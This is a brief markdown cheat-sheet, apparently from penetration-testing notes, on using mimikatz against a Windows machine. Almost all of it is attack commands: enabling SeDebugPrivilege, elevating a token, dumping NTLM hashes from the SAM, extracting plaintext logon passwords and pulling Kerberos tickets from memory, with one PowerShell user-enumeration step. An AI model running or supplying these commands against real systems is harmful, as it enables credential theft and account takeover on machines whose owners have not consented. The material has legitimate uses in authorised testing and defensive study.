### mimikatz
As an early stage enumeration item, worth running: `Get-LocalUser` to enumerate local users on a machine.

To start run `.\mimikatz.exe` in a Powershell session. You'll then be dumped in an interactive session in which the commands below can be run.

Enable the `SeDebugPrivilege` access right: 
```cmd
privilege::debug
```
Elevate privilege (prerequisite for `lsadump::sam`):
```cmd
token::elevate
```
Extract all NTLM hashes from the SAM:
```cmd
lsadump::sam
```
Extract plaintext passwords from all available sources:
```cmd
sekurlsa::logonpasswords
```
Get all tickets stored in memory:
```cmd
sekurlsa::tickets
```